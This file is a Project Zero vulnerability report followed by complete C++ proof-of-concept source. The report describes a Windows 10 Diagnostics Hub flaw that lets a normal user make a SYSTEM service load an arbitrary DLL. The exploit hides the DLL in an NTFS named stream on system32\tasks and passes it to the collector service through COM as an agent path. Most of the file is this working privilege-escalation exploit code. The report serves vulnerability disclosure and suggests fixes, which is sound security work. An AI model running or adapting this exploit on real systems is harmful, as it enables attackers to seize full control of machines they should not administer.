/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=887

Windows: Diagnostics Hub DLL Load EoP
Platform: Windows 10 10586, not tested 8.1 Update 2 or Windows 7
Class: Elevation of Privilege

Summary:
The fix for CVE-2016-3231 is insufficient to prevent a normal user specifying an insecure agent path leading to arbitrary DLL loading at system privileges.

Description:

CVE-2016-3231 was an issue caused by passing a relative agent path name which allowed the DLL path loaded for the agent DLL to be redirected to another file. This seems to have been fixed and as far as I can tell this issue is no longer exploitable from a sandbox. However the problem is there’s an assumption that it’s not possible to write a file to the system32 directory, which technically is true but practically for this exploit false. 

As I’ve blogged about before, and also submitted bugs (for example MSRC-21233) a normal user can created named streams on directories as long as they have FILE_ADD_FILE access right to the directory. When you do this you create what looks from a path perspective to be in the parent. For example the system32\tasks folder is writable by a normal user, so you can copy a DLL to system32\tasks:abc.dll and when GetFullPathName is called the filename returned is tasks:abc.dll. When the GetValidAgentPath is called it checks if this file is in system32 by using GetFileAttributes, which succeeds and the service will proceed to load the file.

On the fixing side of things, I can’t see an obvious reason why just checking for invalid path characters in the agent path wouldn’t be sufficient (and in fact would arguably have fixed the original bug as well). Of course I think it’s slightly dodgy that you’ll load any DLL from system32, even ones which aren’t agent DLLs. You’d have to find something which was somehow exploitable in a very short time window during DllMain but it might work.

Also I wonder whether they’re any legitimate uses for named streams on NTFS directories? While it’s certainly out of scope perhaps they could only be created by admins? Or perhaps the access check shouldn’t be on the target directories but its parent directory where the effective file appears to be located. 

Proof of Concept:

I’ve provided a PoC as a C++ source code file. You’ll also need a DLL to test load, I’ve not provided one of these but any should do, as long as it matches the bitness of the OS.

1) Compile the C++ source code file.
2) Execute the poc passing the path to the DLL you want to load in the service as a normal user.
3) It should print that the DLL was loaded successfully.

Expected Result:
The loading of a DLL fails as the path is rejected.

Observed Result:
The DLL is loaded successfully.
*/


// ExploitCollector.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <comdef.h>
#include <strsafe.h>

GUID CLSID_CollectorService = 
  { 0x42CBFAA7, 0xA4A7, 0x47BB,{ 0xB4, 0x22, 0xBD, 0x10, 0xE9, 0xD0, 0x27, 0x00, } };

class __declspec(uuid("f23721ef-7205-4319-83a0-60078d3ca922")) ICollectionSession : public IUnknown {
public:

  virtual HRESULT __stdcall PostStringToListener(REFGUID, LPWSTR) = 0;
  virtual HRESULT __stdcall PostBytesToListener() = 0;
  virtual HRESULT __stdcall AddAgent(LPWSTR path, REFGUID) = 0;
    //.rdata:0000000180035868                 dq offset ? Start@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Start(tagVARIANT *)
    //.rdata:0000000180035870                 dq offset ? GetCurrentResult@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJFPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetCurrentResult(short, tagVARIANT *)
    //.rdata:0000000180035878                 dq offset ? Pause@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJXZ; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Pause(void)
    //.rdata:0000000180035880                 dq offset ? Resume@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJXZ; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Resume(void)
    //.rdata:0000000180035888                 dq offset ? Stop@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Stop(tagVARIANT *)
    //.rdata:0000000180035890                 dq offset ? TriggerEvent@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJW4SessionEvent@@PEAUtagVARIANT@@11@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::TriggerEvent(SessionEvent, tagVARIANT *, tagVARIANT *, tagVARIANT *)
    //.rdata:0000000180035898                 dq offset ? GetGraphDataUpdates@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJAEBU_GUID@@PEAUtagSAFEARRAY@@PEAUGraphDataUpdates@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetGraphDataUpdates(_GUID const &, tagSAFEARRAY *, GraphDataUpdates *)
    //.rdata:00000001800358A0                 dq offset ? QueryState@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAW4SessionState@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::QueryState(SessionState *)
    //.rdata:00000001800358A8                 dq offset ? GetStatusChangeEventName@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAPEAG@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetStatusChangeEventName(ushort * *)
    //.rdata:00000001800358B0                 dq offset ? GetLastError@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAJ@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetLastError(long *)
    //.rdata:00000001800358B8                 dq offset ? SetClientDelegate@EtwCollectionSession@StandardCollector@DiagnosticsHub@Mic
};

struct SessionConfiguration
{
  DWORD version; // Needs to be 1
  DWORD  a1;     // Unknown
  DWORD  something; // Also unknown
  DWORD  monitor_pid;
  GUID   guid;
  BSTR   path;    // Path to a valid directory
  CHAR   trailing[256];
};

class __declspec(uuid("7e912832-d5e1-4105-8ce1-9aadd30a3809")) IStandardCollectorClientDelegate : public IUnknown
{
};

class __declspec(uuid("0d8af6b7-efd5-4f6d-a834-314740ab8caa")) IStandardCollectorService : public IUnknown
{
public:
  virtual HRESULT __stdcall CreateSession(SessionConfiguration *, IStandardCollectorClientDelegate *, ICollectionSession **) = 0;
  virtual HRESULT __stdcall GetSession(REFGUID, ICollectionSession **) = 0;
  virtual HRESULT __stdcall DestroySession(REFGUID) = 0;
  virtual HRESULT __stdcall DestroySessionAsync(REFGUID) = 0;
  virtual HRESULT __stdcall AddLifetimeMonitorProcessIdForSession(REFGUID, int) = 0;
};

_COM_SMARTPTR_TYPEDEF(IStandardCollectorService, __uuidof(IStandardCollectorService));
_COM_SMARTPTR_TYPEDEF(ICollectionSession, __uuidof(ICollectionSession));

class CoInit
{
public:
  CoInit() {
    CoInitialize(nullptr);
  }

  ~CoInit() {
    CoUninitialize();
  }
};

void ThrowOnError(HRESULT hr)
{
  if (hr != 0)
  {
    throw _com_error(hr);
  }
}

int wmain(int argc, wchar_t** argv)
{
  if (argc < 2)
  {
    printf("poc path\\to\\dll\n");
    return 1;
  }

  CoInit coinit;
  try
  {
    GUID name;
    CoCreateGuid(&name);
    LPOLESTR name_str;
    StringFromIID(name, &name_str);

    WCHAR random_name[MAX_PATH];
    StringCchPrintf(random_name, MAX_PATH, L"tasks:%ls.dll", name_str);

    WCHAR target[MAX_PATH];
    GetSystemDirectory(target, MAX_PATH);
    StringCchCat(target, MAX_PATH, L"\\");
    StringCchCat(target, MAX_PATH, random_name);

    WCHAR valid_dir[MAX_PATH];
    GetModuleFileName(nullptr, valid_dir, MAX_PATH);
    WCHAR* p = wcsrchr(valid_dir, L'\\');
    *p = 0;
    StringCchCat(valid_dir, MAX_PATH, L"\\etw");
    CreateDirectory(valid_dir, nullptr);

    if (!CopyFile(argv[1], target, FALSE))
    {
      printf("Error copying file %d\n", GetLastError());
      return 1;
    }

    IStandardCollectorServicePtr service;
    ThrowOnError(CoCreateInstance(CLSID_CollectorService, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&service)));
    DWORD authn_svc;
    DWORD authz_svc;
    LPOLESTR principal_name;
    DWORD authn_level;
    DWORD imp_level;
    RPC_AUTH_IDENTITY_HANDLE identity;
    DWORD capabilities;

    ThrowOnError(CoQueryProxyBlanket(service, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities));
    ThrowOnError(CoSetProxyBlanket(service, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities));
    SessionConfiguration config = {};
    config.version = 1;
    config.monitor_pid = ::GetCurrentProcessId();
    CoCreateGuid(&config.guid);
    bstr_t path = valid_dir;
    config.path = path;
    ICollectionSessionPtr session;

    ThrowOnError(service->CreateSession(&config, nullptr, &session));
    GUID agent_guid;
    CoCreateGuid(&agent_guid);
    ThrowOnError(session->AddAgent(random_name, agent_guid));
  }
  catch (const _com_error& error)
  {
    if (error.Error() == 0x8007045A)
    {
      printf("DLL should have been loaded\n");
    }
    else
    {
      printf("%ls\n", error.ErrorMessage());
      printf("%08X\n", error.Error());
    }
  }

  return 0;
}